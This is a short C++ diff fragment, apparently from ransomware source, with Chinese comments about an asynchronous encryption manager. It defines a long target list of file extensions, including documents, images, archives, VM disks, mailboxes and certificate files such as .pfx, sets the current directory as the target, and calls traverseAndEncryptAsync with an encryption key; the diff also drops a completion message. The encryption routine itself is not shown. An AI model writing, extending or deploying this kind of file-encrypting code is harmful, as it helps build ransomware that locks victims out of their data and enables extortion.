+       ".javass", ".pys", ".jss", ".ymls", ".inis", ".envs",
+       ".psd", ".ai", ".dwg", ".skp",
+       ".vmdk", ".iso", ".pfx", ".pems",
+       ".pst", ".mbox", ".mpp",
+       ".jar", ".zip", ".tar.gz",
+       ".ppt", ".jpg", ".png", ".txtx", ".jpeg"
     };
-
-    fs::path targetDirectory = fs::current_path();;
+    fs::path targetDirectory = fs::current_path();
     std::cout << "Target directory: " << targetDirectory << std::endl;
 
     // 使用异步加密管理器
     traverseAndEncryptAsync(targetDirectory, extensions, encryptionKey);
-
-    // 显示完成信息
-    showtext();
 
     return 0;
 }
